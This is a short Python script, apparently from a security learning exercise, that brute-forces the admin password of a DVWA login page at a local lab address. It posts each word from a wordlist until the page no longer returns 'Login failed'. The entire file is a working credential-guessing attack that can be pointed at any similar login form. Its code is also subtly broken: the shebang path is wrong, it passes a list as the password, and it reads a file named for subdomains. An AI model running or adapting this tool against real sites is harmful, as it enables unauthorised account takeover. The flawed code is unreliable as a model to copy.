#! /bin/usr/env python3

# Author: Nikhil Sharma B
# Created Date: 02-10-2020
# Last Updated: 02-10-2020
# Operating System: Linux, Windows, Mac
# Description: guess login credentials

# Import the necessary libraries
import requests

target_url = "http://172.17.0.3/dvwa/login.php"
data_dictionary = {"username": "admin", "password": "", "Login": "submit"}

with open("subdomains.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.split()
        data_dictionary["password"] = word
        response = requests.post(target_url, data=data_dictionary)
        if b"Login failed" not in response.content:
            print("[+] Got the password -->", word)
            exit()

print("[-] Reached wordlist end.")
